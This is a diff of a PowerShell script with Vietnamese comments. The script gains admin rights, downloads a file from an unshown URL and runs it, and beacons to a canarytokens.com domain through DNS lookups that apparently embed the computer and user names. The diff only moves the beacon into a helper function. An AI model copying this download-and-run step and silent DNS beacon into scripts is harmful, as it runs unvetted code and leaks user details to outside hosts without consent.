@@ -62,8 +62,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
         Write-Output "Kết thúc tiến trình PowerShell."
-        $id = "rerunadmin"
-        Resolve-DnsName "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
+        Resolve-CanaryToken "rerunadmin"
         Stop-Process -Id $PID -Force
     }
     catch {
@@ -101,7 +100,6 @@ if (Test-Path -Path $output) {
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process $output
-    $id = "blank"
-    Resolve-DnsName "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
+    Resolve-CanaryToken "blank"
 }
 
